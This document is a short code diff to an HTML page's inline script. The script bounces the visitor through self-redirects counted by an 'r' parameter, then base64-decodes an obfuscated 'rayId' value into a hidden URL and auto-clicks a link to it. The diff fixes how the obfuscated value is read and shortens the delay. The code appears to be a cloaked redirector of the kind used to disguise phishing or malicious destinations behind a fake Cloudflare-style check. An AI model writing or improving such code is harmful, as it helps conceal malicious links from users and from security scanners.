@@ -31,12 +31,12 @@
             let h = "";
             if(!u.get("rayId")){ h = "/blog";
             }if((+u.get("r"))===x){
-                kkk = u.rayId.replace("$", kkk[9].toUpperCase())
+                kkk = u.get("rayId").replace("$", kkk[9].toUpperCase())
                 h = atob(kkk)
             }else h = window.location.href.split("?")[0]+"?r="+(parseInt(u.get("r") || "0")+1)+"&rayId="+encodeURIComponent(u.get("rayId"));
             a.href = h;
             a.click();
-        }, 1000)
+        }, 500)
     </script>
   </body>
 </html>
